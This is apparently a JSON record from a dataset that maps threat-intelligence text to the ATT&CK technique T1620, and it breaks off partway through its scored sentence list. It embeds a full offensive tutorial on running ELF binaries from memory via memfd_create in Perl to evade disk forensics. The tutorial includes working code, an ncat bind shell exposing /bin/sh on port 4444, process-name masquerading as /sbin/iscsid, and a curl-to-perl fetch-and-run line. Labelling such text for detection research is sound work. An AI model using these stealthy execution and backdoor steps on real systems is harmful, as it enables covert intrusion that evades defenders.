@@ -1,0 +1,240 @@
+{
+  "original_txt": "In-Memory-Only ELF Execution (Without tmpfs)\nIn which we run a normal ELF binary on Linux without touching the filesystem\n(except /proc\n).\nIntroduction\nEvery so often, it’s handy to execute an ELF binary without touching disk.\nNormally, putting it somewhere under /run/user\nor something else backed by\ntmpfs works just fine,\nbut, outside of disk forensics, that looks like a regular file operation.\nWouldn’t it be cool to just grab a chunk of memory, put our binary in there,\nand run it without monkey-patching the kernel, rewriting execve(2)\nin\nuserland, or loading a library into\nanother process?\nEnter\nmemfd_create(2)\n.\nThis handy little system call is something like\nmalloc(3)\n, but instead\nof returning a pointer to a chunk of memory, it returns a file descriptor which\nrefers to an anonymous (i.e. memory-only) file. This is only visible in the\nfilesystem as a symlink in /proc/<PID>/fd/\n(e.g. /proc/10766/fd/3\n), which,\nas it turns out, execve(2)\nwill happily use to execute an ELF\nbinary.\nThe manpage has the following to say on the subject of naming anonymous files:\nThe name supplied in\nname\n[an argument tomemfd_create(2)\n] is used as a filename and will be displayed as the target of the corresponding symbolic link in the directory/proc/self/fd/\n. The displayed name is always prefixed withmemfd:\nand serves only for debugging purposes. Names do not affect the behavior of the file descriptor, and as such multiple files can have the same name without any side effects.\nIn other words, we can give it a name (to which memfd:\nwill be prepended),\nbut what we call it doesn’t really do anything except help debugging (or\nforensicing). We can even give the anonymous file an empty name.\nListing /proc/<PID>/fd\n, anonymous files look like this:\nstuart@ubuntu-s-1vcpu-1gb-nyc1-01:~$ ls -l /proc/10766/fd\ntotal 0\nlrwx------ 1 stuart stuart 64 Mar 30 23:23 0 -> /dev/pts/0\nlrwx------ 1 stuart stuart 64 Mar 30 23:23 1 -> /dev/pts/0\nlrwx------ 1 stuart stuart 64 Mar 30 23:23 2 -> /dev/pts/0\nlrwx------ 1 stuart stuart 64 Mar 30 23:23 3 -> /memfd:kittens (deleted)\nlrwx------ 1 stuart stuart 64 Mar 30 23:23 4 -> /memfd: (deleted)\nHere we see two anonymous files, one named kittens\nand one without a name at\nall. The (deleted)\nis inaccurate and looks a bit weird but c’est la vie.\nCaveats\nUnless we land on target with some way to call memfd_create(2)\n, from our\ninitial vector (e.g. injection into a Perl or Python program with\neval()\n),\nwe’ll need a way to execute system calls on target. We could drop a binary to\ndo this, but then we’ve failed to acheive fileless ELF execution. Fortunately,\nPerl’s syscall()\nsolves\nthis problem for us nicely.\nWe’ll also need a way to write an entire binary to the target’s memory as the contents of the anonymous file. For this, we’ll put it in the source of the script we’ll write to do the injection, but in practice pulling it down over the network is a viable alternative.\nAs for the binary itself, it has to be, well, a binary. Running scripts\nstarting with #!/interpreter\ndoesn’t seem to work.\nThe last thing we need is a sufficiently new kernel. Anything version\n3.17\n(released 05 October 2014) or later\nwill work. We can find the target’s kernel version with uname -r\n.\nstuart@ubuntu-s-1vcpu-1gb-nyc1-01:~$ uname -r\n4.4.0-116-generic\nOn Target\nAside execve(2)\ning an anonymous file instead of a regular filesystem file\nand doing it all in Perl, there isn’t much difference from starting any other\nprogram. Let’s have a look at the system calls we’ll use.\nmemfd_create(2)\nMuch like a memory-backed fd = open(name, O_CREAT|O_RDWR, 0700)\n, we’ll use\nthe memfd_create(2)\nsystem call to make our anonymous file. We’ll pass it\nthe MFD_CLOEXEC\nflag (analogous to O_CLOEXEC\n), so that the file descriptor\nwe get will be automatically closed when we execve(2)\nthe ELF binary.\nBecause we’re using Perl’s syscall()\nto call the memfd_create(2)\n, we don’t\nhave easy access to a user-friendly libc wrapper function or, for that matter,\na nice human-readable MFD_CLOEXEC\nconstant. Instead, we’ll need to pass\nsyscall()\nthe raw system call number for memfd_create(2)\nand the numeric\nconstant for MEMFD_CLOEXEC\n. Both of these are found in header files in\n/usr/include\n. System call numbers are stored in #define\ns starting with\n__NR_\n.\nstuart@ubuntu-s-1vcpu-1gb-nyc1-01:/usr/include$ egrep -r '__NR_memfd_create|MFD_CLOEXEC' *\nasm-generic/unistd.h:#define __NR_memfd_create 279\nasm-generic/unistd.h:__SYSCALL(__NR_memfd_create, sys_memfd_create)\nlinux/memfd.h:#define MFD_CLOEXEC 0x0001U\nx86_64-linux-gnu/asm/unistd_64.h:#define __NR_memfd_create 319\nx86_64-linux-gnu/asm/unistd_32.h:#define __NR_memfd_create 356\nx86_64-linux-gnu/asm/unistd_x32.h:#define __NR_memfd_create (__X32_SYSCALL_BIT + 319)\nx86_64-linux-gnu/bits/syscall.h:#define SYS_memfd_create __NR_memfd_create\nx86_64-linux-gnu/bits/syscall.h:#define SYS_memfd_create __NR_memfd_create\nx86_64-linux-gnu/bits/syscall.h:#define SYS_memfd_create __NR_memfd_create\nLooks like memfd_create(2)\nis system call number 319 on 64-bit Linux\n(#define __NR_memfd_create\nin a file with a name ending in _64.h\n), and\nMFD_CLOEXEC\nis a consatnt 0x0001U\n(i.e. 1, in linux/memfd.h\n). Now that\nwe’ve got the numbers we need, we’re almost ready to do the Perl equivalent of\nC’s fd = memfd_create(name, MFD_CLOEXEC)\n(or more specifically, fd =\nsyscall(319, name, MFD_CLOEXEC)\n).\nThe last thing we need is a name for our file. In a file listing, /memfd:\nis\nprobably a bit better-looking than /memfd:kittens\n, so we’ll pass an empty\nstring to memfd_create(2)\nvia syscall()\n. Perl’s syscall()\nwon’t take\nstring literals (due to passing a pointer under the hood), so we make a\nvariable with the empty string and use it instead.\nPutting it together, let’s finally make our anonymous file:\nmy $name = \"\";\nmy $fd = syscall(319, $name, 1);\nif (-1 == $fd) {\ndie \"memfd_create: $!\";\n}\nWe now have a file descriptor number in $fd\n. We can wrap that up in a Perl\none-liner which lists its own file descriptors after making the anonymous file:\nstuart@ubuntu-s-1vcpu-1gb-nyc1-01:~$ perl -e '$n=\"\";die$!if-1==syscall(319,$n,1);print`ls -l /proc/$$/fd`'\ntotal 0\nlrwx------ 1 stuart stuart 64 Mar 31 02:44 0 -> /dev/pts/0\nlrwx------ 1 stuart stuart 64 Mar 31 02:44 1 -> /dev/pts/0\nlrwx------ 1 stuart stuart 64 Mar 31 02:44 2 -> /dev/pts/0\nlrwx------ 1 stuart stuart 64 Mar 31 02:44 3 -> /memfd: (deleted)\nwrite(2)\nNow that we have an anonymous file, we need to fill it with ELF data. First we’ll need to get a Perl filehandle from a file descriptor, then we’ll need to get our data in a format that can be written, and finally, we’ll write it.\nPerl’s open()\n, which is\nnormally used to open files, can also be used to turn an already-open file\ndescriptor into a file handle by specifying something like >&=X\n(where X is a\nfile descriptor) instead of a file name. We’ll also want to enable\nautoflush on the new file\nhandle:\nopen(my $FH, '>&='.$fd) or die \"open: $!\";\nselect((select($FH), $|=1)[0]);\nWe now have a file handle which refers to our anonymous file.\nNext we need to make our binary available to Perl, so we can write it to the anonymous file. We’ll turn the binary into a bunch of Perl print statements of which each write a chunk of our binary to the anonymous file.\nperl -e '$/=\\32;print\"print \\$FH pack q/H*/, q/\".(unpack\"H*\").\"/\\ or die qq/write: \\$!/;\\n\"while(<>)' ./elfbinary\nThis will give us many, many lines similar to:\nprint $FH pack q/H*/, q/7f454c4602010100000000000000000002003e0001000000304f450000000000/ or die qq/write: $!/;\nprint $FH pack q/H*/, q/4000000000000000c80100000000000000000000400038000700400017000300/ or die qq/write: $!/;\nprint $FH pack q/H*/, q/0600000004000000400000000000000040004000000000004000400000000000/ or die qq/write: $!/;\nExceuting those puts our ELF binary into memory. Time to run it.\nOptional: fork(2)\nOk, fork(2)\nis isn’t\nactually a system call; it’s really a libc function which does all sorts of\nstuff under the hood. Perl’s\nfork()\nis functionally\nidentical to libc’s as far as process-making goes: once it’s called, there are\nnow two nearly identical processes running (of which one, usually the child,\noften finds itself calling exec(2)\n). We don’t actually have to spawn a new\nprocess to run our ELF binary, but if we want to do more than just run it and\nexit (say, run it multiple times), it’s the way to go. In general, using\nfork()\nto spawn multiple children looks something like:\nwhile ($keep_going) {\nmy $pid = fork();\nif (-1 == $pid) { # Error\ndie \"fork: $!\";\n}\nif (0 == $pid) { # Child\n# Do child things here\nexit 0;\n}\n}\nAnother handy use of fork()\n, especially when done twice with a call to\nsetsid(2)\nin the middle, is to spawn a disassociated child and let the parent\nterminate:\n# Spawn child\nmy $pid = fork();\nif (-1 == $pid) { # Error\ndie \"fork1: $!\";\n}\nif (0 != $pid) { # Parent terminates\nexit 0;\n}\n# In the child, become session leader\nif (-1 == syscall(112)) {\ndie \"setsid: $!\";\n}\n# Spawn grandchild\n$pid = fork();\nif (-1 == $pid) { # Error\ndie \"fork2: $!\";\n}\nif (0 != $pid) { # Child terminates\nexit 0;\n}\n# In the grandchild here, do grandchild things\nWe can now have our ELF process run multiple times or in a separate process. Let’s do it.\nexecve(2)\nLinux process creation is a funny thing. Ever since the early days of\nUnix,\nprocess creation has been a combination of not much more than duplicating a\ncurrent process and swapping out the new clone’s program with what should be\nrunning, and on Linux it’s no different. The\nexecve(2)\nsystem call\ndoes the second bit: it changes one running program into another. Perl gives\nus exec()\n, which does more or\nless the same, albiet with easier syntax.\nWe pass to exec()\ntwo things: the file containing the program to execute\n(i.e. our in-memory ELF binary) and a list of arguments, of which the first\nelement is usually taken as the process name. Usually, the file and the\nprocess name are the same, but since it’d look bad to have /proc/<PID>/fd/3\nin a process listing, we’ll name our process something else.\nThe syntax for calling exec()\nis a bit odd, and explained much better in the\ndocumentation. For now, we’ll take it on faith that the file is passed as a\nstring in curly braces and there follows a comma-separated list of process\narguments. We can use the variable $$\nto get the pid of our own Perl\nprocess. For the sake of clarity, the following assumes we’ve put ncat\nin\nmemory, but in practice, it’s better to use something which takes arguments\nthat don’t look like a backdoor.\nexec {\"/proc/$$/fd/$fd\"} \"kittens\", \"-kvl\", \"4444\", \"-e\", \"/bin/sh\" or die \"exec: $!\";\nThe new process won’t have the anonymous file open as a symlink in\n/proc/<PID>/fd\n, but the anonymous file will be visible as the\n/proc/<PID>/exe\nsymlink, which normally points to the file containing the\nprogram which is being executed by the process.\nWe’ve now got an ELF binary running without putting anything on disk or even in the filesystem.\nScripting it\nIt’s not likely we’ll have the luxury of being able to sit on target and do all\nof the above by hand. Instead, we’ll pipe the script (elfload.pl\nin the\nexample below) via SSH to Perl’s stdin, and use a bit of shell trickery to keep\nperl\nwith no arguments from showing up in the process list:\ncat ./elfload.pl | ssh user@target /bin/bash -c '\"exec -a /sbin/iscsid perl\"'\nThis will run Perl, renamed in the process list to /sbin/iscsid\nwith no\narguments. When not given a script or a bit of code with -e\n, Perl expects a\nscript on stdin, so we send the script to perl stdin via our local SSH client.\nThe end result is our script is run without touching disk at all.\nWithout creds but with access to the target (i.e. after exploiting on), in most\ncases we can probably use the devopsy curl http://server/elfload.pl | perl\ntrick (or intercept someone doing the trick for us). As long as the script\nmakes it to Perl’s stdin and Perl gets an EOF when the script’s all read, it\ndoesn’t particularly matter how it gets there.\nArtifacts\nOnce running, the only real difference between a program running from an\nanonymous file and a program running from a normal file is the\n/proc/<PID>/exe\nsymlink.\nIf something’s monitoring system calls (e.g. someone’s running strace -f\non\nsshd), the memfd_create(2)\ncalls will stick out, as will passing paths in\n/proc/<PID>/fd\nto execve(2)\n.\nOther than that, there’s very little evidence anything is wrong.\nDemo\nTo see this in action, have a look at this asciicast.\nTL;DR\nIn C (translate to your non-disk-touching language of choice):\nfd = memfd_create(\"\", MFD_CLOEXEC);\nwrite(fd, elfbuffer, elfbuffer_len);\nasprintf(p, \"/proc/self/fd/%i\", fd); execl(p, \"kittens\", \"arg1\", \"arg2\", NULL);\nUpdated 20170402 to link to\nhttps://0x00sec.org/t/super-stealthy-droppers/3715, from where I got\nexecve(\"/proc/<PID>/fd/<FD>...",
+  "sanitized_txt": "In-Memory-Only ELF Execution (Without tmpfs) In which we run a normal ELF binary on Linux without touching the filesystem (except /proc ).\nIntroduction Every so often, it’s handy to execute an ELF binary without touching disk.\nNormally, putting it somewhere under /run/user or something else backed by tmpfs works just fine, but, outside of disk forensics, that looks like a regular file operation.\nWouldn’t it be cool to just grab a chunk of memory, put our binary in there, and run it without monkey-patching the kernel, rewriting execve(2) in userland, or loading a library into another process?\nEnter memfd_create(2) .\nThis handy little system call is something like malloc(3) , but instead of returning a pointer to a chunk of memory, it returns a file descriptor which refers to an anonymous (i.e. memory-only) file. This is only visible in the filesystem as a symlink in /proc/<PID>/fd/ (e.g. /proc/10766/fd/3 ), which, as it turns out, execve(2) will happily use to execute an ELF binary.\nThe manpage has the following to say on the subject of naming anonymous files:\nThe name supplied in name [an argument tomemfd_create(2) ] is used as a filename and will be displayed as the target of the corresponding symbolic link in the directory/proc/self/fd/ . The displayed name is always prefixed withmemfd:\nand serves only for debugging purposes. Names do not affect the behavior of the file descriptor, and as such multiple files can have the same name without any side effects.\nIn other words, we can give it a name (to which memfd:\nwill be prepended), but what we call it doesn’t really do anything except help debugging (or forensicing). We can even give the anonymous file an empty name.\nListing /proc/<PID>/fd , anonymous files look like this:\nstuart@ubuntu-s-1vcpu-1gb-nyc1-01:~$ ls -l /proc/10766/fd total 0 lrwx------ 1 stuart stuart 64 Mar 30 23:23 0 -> /dev/pts/0 lrwx------ 1 stuart stuart 64 Mar 30 23:23 1 -> /dev/pts/0 lrwx------ 1 stuart stuart 64 Mar 30 23:23 2 -> /dev/pts/0 lrwx------ 1 stuart stuart 64 Mar 30 23:23 3 -> /memfd:kittens (deleted) lrwx------ 1 stuart stuart 64 Mar 30 23:23 4 -> /memfd: (deleted) Here we see two anonymous files, one named kittens and one without a name at all. The (deleted) is inaccurate and looks a bit weird but c’est la vie.\nCaveats Unless we land on target with some way to call memfd_create(2) , from our initial vector (e.g. injection into a Perl or Python program with eval() ), we’ll need a way to execute system calls on target. We could drop a binary to do this, but then we’ve failed to acheive fileless ELF execution. Fortunately, Perl’s syscall() solves this problem for us nicely.\nWe’ll also need a way to write an entire binary to the target’s memory as the contents of the anonymous file. For this, we’ll put it in the source of the script we’ll write to do the injection, but in practice pulling it down over the network is a viable alternative.\nAs for the binary itself, it has to be, well, a binary. Running scripts starting with #!/interpreter doesn’t seem to work.\nThe last thing we need is a sufficiently new kernel. Anything version 3.17 (released 05 October 2014) or later will work. We can find the target’s kernel version with uname -r .\nstuart@ubuntu-s-1vcpu-1gb-nyc1-01:~$ uname -r 4.4.0-116-generic On Target Aside execve(2) ing an anonymous file instead of a regular filesystem file and doing it all in Perl, there isn’t much difference from starting any other program. Let’s have a look at the system calls we’ll use.\nmemfd_create(2) Much like a memory-backed fd = open(name, O_CREAT|O_RDWR, 0700) , we’ll use the memfd_create(2) system call to make our anonymous file. We’ll pass it the MFD_CLOEXEC flag (analogous to O_CLOEXEC ), so that the file descriptor we get will be automatically closed when we execve(2) the ELF binary.\nBecause we’re using Perl’s syscall() to call the memfd_create(2) , we don’t have easy access to a user-friendly libc wrapper function or, for that matter, a nice human-readable MFD_CLOEXEC constant. Instead, we’ll need to pass syscall() the raw system call number for memfd_create(2) and the numeric constant for MEMFD_CLOEXEC . Both of these are found in header files in /usr/include . System call numbers are stored in #define s starting with __NR_ .\nstuart@ubuntu-s-1vcpu-1gb-nyc1-01:/usr/include$ egrep -r '__NR_memfd_create|MFD_CLOEXEC' * asm-generic/unistd.h:#define __NR_memfd_create 279 asm-generic/unistd.h:__SYSCALL(__NR_memfd_create, sys_memfd_create) linux/memfd.h:#define MFD_CLOEXEC 0x0001U x86_64-linux-gnu/asm/unistd_64.h:#define __NR_memfd_create 319 x86_64-linux-gnu/asm/unistd_32.h:#define __NR_memfd_create 356 x86_64-linux-gnu/asm/unistd_x32.h:#define __NR_memfd_create (__X32_SYSCALL_BIT + 319) x86_64-linux-gnu/bits/syscall.h:#define SYS_memfd_create __NR_memfd_create x86_64-linux-gnu/bits/syscall.h:#define SYS_memfd_create __NR_memfd_create x86_64-linux-gnu/bits/syscall.h:#define SYS_memfd_create __NR_memfd_create Looks like memfd_create(2) is system call number 319 on 64-bit Linux (#define __NR_memfd_create in a file with a name ending in _64.h ), and MFD_CLOEXEC is a consatnt 0x0001U (i.e. 1, in linux/memfd.h ). Now that we’ve got the numbers we need, we’re almost ready to do the Perl equivalent of C’s fd = memfd_create(name, MFD_CLOEXEC) (or more specifically, fd = syscall(319, name, MFD_CLOEXEC) ).\nThe last thing we need is a name for our file. In a file listing, /memfd:\nis probably a bit better-looking than /memfd:kittens , so we’ll pass an empty string to memfd_create(2) via syscall() . Perl’s syscall() won’t take string literals (due to passing a pointer under the hood), so we make a variable with the empty string and use it instead.\nPutting it together, let’s finally make our anonymous file:\nmy $name = \"\";\nmy $fd = syscall(319, $name, 1);\nif (-1 == $fd) { die \"memfd_create: $!\";\n} We now have a file descriptor number in $fd . We can wrap that up in a Perl one-liner which lists its own file descriptors after making the anonymous file:\nstuart@ubuntu-s-1vcpu-1gb-nyc1-01:~$ perl -e '$n=\"\";die$!if-1==syscall(319,$n,1);print`ls -l /proc/$$/fd`' total 0 lrwx------ 1 stuart stuart 64 Mar 31 02:44 0 -> /dev/pts/0 lrwx------ 1 stuart stuart 64 Mar 31 02:44 1 -> /dev/pts/0 lrwx------ 1 stuart stuart 64 Mar 31 02:44 2 -> /dev/pts/0 lrwx------ 1 stuart stuart 64 Mar 31 02:44 3 -> /memfd: (deleted) write(2) Now that we have an anonymous file, we need to fill it with ELF data. First we’ll need to get a Perl filehandle from a file descriptor, then we’ll need to get our data in a format that can be written, and finally, we’ll write it.\nPerl’s open() , which is normally used to open files, can also be used to turn an already-open file descriptor into a file handle by specifying something like >&=X (where X is a file descriptor) instead of a file name. We’ll also want to enable autoflush on the new file handle:\nopen(my $FH, '>&='.$fd) or die \"open: $!\";\nselect((select($FH), $|=1)[0]);\nWe now have a file handle which refers to our anonymous file.\nNext we need to make our binary available to Perl, so we can write it to the anonymous file. We’ll turn the binary into a bunch of Perl print statements of which each write a chunk of our binary to the anonymous file.\nperl -e '$/=\\32;print\"print \\$FH pack q/H*/, q/\".(unpack\"H*\").\"/\\ or die qq/write: \\$!/;\\n\"while(<>)' ./elfbinary This will give us many, many lines similar to:\nprint $FH pack q/H*/, q/7f454c4602010100000000000000000002003e0001000000304f450000000000/ or die qq/write: $!/;\nprint $FH pack q/H*/, q/4000000000000000c80100000000000000000000400038000700400017000300/ or die qq/write: $!/;\nprint $FH pack q/H*/, q/0600000004000000400000000000000040004000000000004000400000000000/ or die qq/write: $!/;\nExceuting those puts our ELF binary into memory. Time to run it.\nOptional: fork(2) Ok, fork(2) is isn’t actually a system call; it’s really a libc function which does all sorts of stuff under the hood. Perl’s fork() is functionally identical to libc’s as far as process-making goes: once it’s called, there are now two nearly identical processes running (of which one, usually the child, often finds itself calling exec(2) ). We don’t actually have to spawn a new process to run our ELF binary, but if we want to do more than just run it and exit (say, run it multiple times), it’s the way to go. In general, using fork() to spawn multiple children looks something like:\nwhile ($keep_going) { my $pid = fork();\nif (-1 == $pid) { # Error die \"fork: $!\";\n} if (0 == $pid) { # Child # Do child things here exit 0;\n} } Another handy use of fork() , especially when done twice with a call to setsid(2) in the middle, is to spawn a disassociated child and let the parent terminate:\n# Spawn child my $pid = fork();\nif (-1 == $pid) { # Error die \"fork1: $!\";\n} if (0 != $pid) { # Parent terminates exit 0;\n} # In the child, become session leader if (-1 == syscall(112)) { die \"setsid: $!\";\n} # Spawn grandchild $pid = fork();\nif (-1 == $pid) { # Error die \"fork2: $!\";\n} if (0 != $pid) { # Child terminates exit 0;\n} # In the grandchild here, do grandchild things We can now have our ELF process run multiple times or in a separate process. Let’s do it.\nexecve(2) Linux process creation is a funny thing. Ever since the early days of Unix, process creation has been a combination of not much more than duplicating a current process and swapping out the new clone’s program with what should be running, and on Linux it’s no different. The execve(2) system call does the second bit: it changes one running program into another. Perl gives us exec() , which does more or less the same, albiet with easier syntax.\nWe pass to exec() two things: the file containing the program to execute (i.e. our in-memory ELF binary) and a list of arguments, of which the first element is usually taken as the process name. Usually, the file and the process name are the same, but since it’d look bad to have /proc/<PID>/fd/3 in a process listing, we’ll name our process something else.\nThe syntax for calling exec() is a bit odd, and explained much better in the documentation. For now, we’ll take it on faith that the file is passed as a string in curly braces and there follows a comma-separated list of process arguments. We can use the variable $$ to get the pid of our own Perl process. For the sake of clarity, the following assumes we’ve put ncat in memory, but in practice, it’s better to use something which takes arguments that don’t look like a backdoor.\nexec {\"/proc/$$/fd/$fd\"} \"kittens\", \"-kvl\", \"4444\", \"-e\", \"/bin/sh\" or die \"exec: $!\";\nThe new process won’t have the anonymous file open as a symlink in /proc/<PID>/fd , but the anonymous file will be visible as the /proc/<PID>/exe symlink, which normally points to the file containing the program which is being executed by the process.\nWe’ve now got an ELF binary running without putting anything on disk or even in the filesystem.\nScripting it It’s not likely we’ll have the luxury of being able to sit on target and do all of the above by hand. Instead, we’ll pipe the script (elfload.pl in the example below) via SSH to Perl’s stdin, and use a bit of shell trickery to keep perl with no arguments from showing up in the process list:\ncat ./elfload.pl | ssh user@target /bin/bash -c '\"exec -a /sbin/iscsid perl\"' This will run Perl, renamed in the process list to /sbin/iscsid with no arguments. When not given a script or a bit of code with -e , Perl expects a script on stdin, so we send the script to perl stdin via our local SSH client.\nThe end result is our script is run without touching disk at all.\nWithout creds but with access to the target (i.e. after exploiting on), in most cases we can probably use the devopsy curl http://server/elfload.pl | perl trick (or intercept someone doing the trick for us). As long as the script makes it to Perl’s stdin and Perl gets an EOF when the script’s all read, it doesn’t particularly matter how it gets there.\nArtifacts Once running, the only real difference between a program running from an anonymous file and a program running from a normal file is the /proc/<PID>/exe symlink.\nIf something’s monitoring system calls (e.g. someone’s running strace -f on sshd), the memfd_create(2) calls will stick out, as will passing paths in /proc/<PID>/fd to execve(2) .\nOther than that, there’s very little evidence anything is wrong.\nDemo To see this in action, have a look at this asciicast.\nTL;DR In C (translate to your non-disk-touching language of choice):\nfd = memfd_create(\"\", MFD_CLOEXEC);\nwrite(fd, elfbuffer, elfbuffer_len);\nasprintf(p, \"/proc/self/fd/%i\", fd); execl(p, \"kittens\", \"arg1\", \"arg2\", NULL);\nUpdated 20170402 to link to https://0x00sec.org/t/super-stealthy-droppers/3715, from where I got execve(\"/proc/<PID>/fd/<FD>...",
+  "ID_list": [
+    "T1620"
+  ],
+  "Name_list": [
+    "Execution",
+    "Scripting",
+    "Source"
+  ],
+  "TTP_sentences": {
+    "T1620": [
+      {
+        "sentence": "In-Memory-Only ELF Execution (Without tmpfs) In which we run a normal ELF binary on Linux without touching the filesystem (except /proc ).",
+        "score": 0.584
+      },
+      {
+        "sentence": "Introduction Every so often, it’s handy to execute an ELF binary without touching disk.",
+        "score": 0.6182
+      },
+      {
+        "sentence": "Normally, putting it somewhere under /run/user or something else backed by tmpfs works just fine, but, outside of disk forensics, that looks like a regular file operation.",
+        "score": 0.3319
+      },
+      {
+        "sentence": "Wouldn’t it be cool to just grab a chunk of memory, put our binary in there, and run it without monkey-patching the kernel, rewriting execve(2) in userland, or loading a library into another process?",
+        "score": 0.7672
+      },
+      {
+        "sentence": "Enter memfd_create(2) .",
+        "score": 0.405
+      },
+      {
+        "sentence": "This handy little system call is something like malloc(3) , but instead of returning a pointer to a chunk of memory, it returns a file descriptor which refers to an anonymous (i.e. memory-only) file.",
+        "score": 0.4729
+      },
+      {
+        "sentence": "This is only visible in the filesystem as a symlink in /proc/<PID>/fd/ (e.g. /proc/10766/fd/3 ), which, as it turns out, execve(2) will happily use to execute an ELF binary.",
+        "score": 0.4534
+      },
+      {
+        "sentence": "The displayed name is always prefixed withmemfd: and serves only for debugging purposes.",
+        "score": 0.3316
+      },
+      {
+        "sentence": "In other words, we can give it a name (to which memfd: will be prepended), but what we call it doesn’t really do anything except help debugging (or forensicing).",
+        "score": 0.4282
+      },
+      {
+        "sentence": "The (deleted) is inaccurate and looks a bit weird but c’est la vie.",
+        "score": 0.3961
+      },
+      {
+        "sentence": "Caveats Unless we land on target with some way to call memfd_create(2) , from our initial vector (e.g. injection into a Perl or Python program with eval() ), we’ll need a way to execute system calls on target.",
+        "score": 0.608
+      },
+      {
+        "sentence": "We could drop a binary to do this, but then we’ve failed to acheive fileless ELF execution.",
+        "score": 0.65
+      },
+      {
+        "sentence": "Fortunately, Perl’s syscall() solves this problem for us nicely.",
+        "score": 0.3695
+      },
+      {
+        "sentence": "We’ll also need a way to write an entire binary to the target’s memory as the contents of the anonymous file.",
+        "score": 0.5756
+      },
+      {
+        "sentence": "For this, we’ll put it in the source of the script we’ll write to do the injection, but in practice pulling it down over the network is a viable alternative.",
+        "score": 0.5208
+      },
+      {
+        "sentence": "As for the binary itself, it has to be, well, a binary.",
+        "score": 0.5242
+      },
+      {
+        "sentence": "Running scripts starting with #!/interpreter doesn’t seem to work.",
+        "score": 0.4303
+      },
+      {
+        "sentence": "The last thing we need is a sufficiently new kernel.",
+        "score": 0.3793
+      },
+      {
+        "sentence": "Anything version 3.17 (released 05 October 2014) or later will work.",
+        "score": 0.3607
+      },
+      {
+        "sentence": "We can find the target’s kernel version with uname -r . stuart@ubuntu-s-1vcpu-1gb-nyc1-01:~$ uname -r 4.4.0-116-generic On Target Aside execve(2) ing an anonymous file instead of a regular filesystem file and doing it all in Perl, there isn’t much difference from starting any other program.",
+        "score": 0.3402
+      },
+      {
+        "sentence": "Let’s have a look at the system calls we’ll use. memfd_create(2) Much like a memory-backed fd = open(name, O_CREAT|O_RDWR, 0700) , we’ll use the memfd_create(2) system call to make our anonymous file.",
+        "score": 0.3529
+      },
+      {
+        "sentence": "We’ll pass it the MFD_CLOEXEC flag (analogous to O_CLOEXEC ), so that the file descriptor we get will be automatically closed when we execve(2) the ELF binary.",
+        "score": 0.4004
+      },
+      {
+        "sentence": "Because we’re using Perl’s syscall() to call the memfd_create(2) , we don’t have easy access to a user-friendly libc wrapper function or, for that matter, a nice human-readable MFD_CLOEXEC constant.",
+        "score": 0.5026
+      },
+      {
+        "sentence": "Instead, we’ll need to pass syscall() the raw system call number for memfd_create(2) and the numeric constant for MEMFD_CLOEXEC .",
+        "score": 0.3793
+      },
+      {
+        "sentence": "Both of these are found in header files in /usr/include .",
+        "score": 0.3869
+      },
+      {
+        "sentence": "1, in linux/memfd.h ).",
+        "score": 0.3459
+      },
+      {
+        "sentence": "Now that we’ve got the numbers we need, we’re almost ready to do the Perl equivalent of C’s fd = memfd_create(name, MFD_CLOEXEC) (or more specifically, fd = syscall(319, name, MFD_CLOEXEC) ).",
+        "score": 0.4279
+      },
+      {
+        "sentence": "In a file listing, /memfd: is probably a bit better-looking than /memfd:kittens , so we’ll pass an empty string to memfd_create(2) via syscall() .",
+        "score": 0.3437
+      },
+      {
+        "sentence": "Perl’s syscall() won’t take string literals (due to passing a pointer under the hood), so we make a variable with the empty string and use it instead.",
+        "score": 0.4556
+      },
+      {
+        "sentence": "Putting it together, let’s finally make our anonymous file: my $name = \"\"; my $fd = syscall(319, $name, 1); if (-1 == $fd) { die \"memfd_create: $!\"; } We now have a file descriptor number in $fd .",
+        "score": 0.3336
+      },
+      {
+        "sentence": "First we’ll need to get a Perl filehandle from a file descriptor, then we’ll need to get our data in a format that can be written, and finally, we’ll write it.",
+        "score": 0.4405
+      },
+      {
+        "sentence": "Perl’s open() , which is normally used to open files, can also be used to turn an already-open file descriptor into a file handle by specifying something like >&=X (where X is a file descriptor) instead of a file name.",
+        "score": 0.3159
+      },
+      {
+        "sentence": "Next we need to make our binary available to Perl, so we can write it to the anonymous file.",
+        "score": 0.43
+      },
+      {
+        "sentence": "Time to run it.",
+        "score": 0.3141
+      },
+      {
+        "sentence": "Optional: fork(2) Ok, fork(2) is isn’t actually a system call; it’s really a libc function which does all sorts of stuff under the hood.",
+        "score": 0.4412
+      },
+      {
+        "sentence": "Perl’s fork() is functionally identical to libc’s as far as process-making goes: once it’s called, there are now two nearly identical processes running (of which one, usually the child, often finds itself calling exec(2) ).",
+        "score": 0.4652
+      },
+      {
+        "sentence": "We don’t actually have to spawn a new process to run our ELF binary, but if we want to do more than just run it and exit (say, run it multiple times), it’s the way to go.",
+        "score": 0.6133
+      },
+      {
+        "sentence": "Let’s do it. execve(2) Linux process creation is a funny thing.",
+        "score": 0.4671
+      },
+      {
+        "sentence": "Ever since the early days of Unix, process creation has been a combination of not much more than duplicating a current process and swapping out the new clone’s program with what should be running, and on Linux it’s no different.",
+        "score": 0.648
+      },
+      {
+        "sentence": "The execve(2) system call does the second bit: it changes one running program into another.",
+        "score": 0.5627
+      },
+      {
+        "sentence": "Perl gives us exec() , which does more or less the same, albiet with easier syntax.",
+        "score": 0.4412
+      },
+      {
+        "sentence": "We pass to exec() two things: the file containing the program to execute (i.e. our in-memory ELF binary) and a list of arguments, of which the first element is usually taken as the process name.",
+        "score": 0.5584
+      },
+      {
+        "sentence": "Usually, the file and the process name are the same, but since it’d look bad to have /proc/<PID>/fd/3 in a process listing, we’ll name our process something else.",
+        "score": 0.3706
+      },
+      {
+        "sentence": "The syntax for calling exec() is a bit odd, and explained much better in the documentation.",
+        "score": 0.412
+      },
+      {
+        "sentence": "For now, we’ll take it on faith that the file is passed as a string in curly braces and there follows a comma-separated list of process arguments.",
+        "score": 0.4789
+      },
+      {
+        "sentence": "We can use the variable $$ to get the pid of our own Perl process.",
+        "score": 0.3084
+      },
+      {
+        "sentence": "We’ve now got an ELF binary running without putting anything on disk or even in the filesystem.",
+        "score": 0.6066
+      },
+      {
+        "sentence": "Scripting it It’s not likely we’ll have the luxury of being able to sit on target and do all of the above by hand.",
+        "score": 0.4143
+      },
+      {
+        "sentence": "Instead, we’ll pipe the script (elfload.pl in the example below) via SSH to Perl’s stdin, and use a bit of shell trickery to keep perl with no arguments from showing up in the process list: cat ./elfload.pl | ssh user@target /bin/bash -c '\"exec -a /sbin/iscsid perl\"' This will run Perl, renamed in the process list to /sbin/iscsid with no arguments.",
+        "score": 0.3948
+      },
+      {
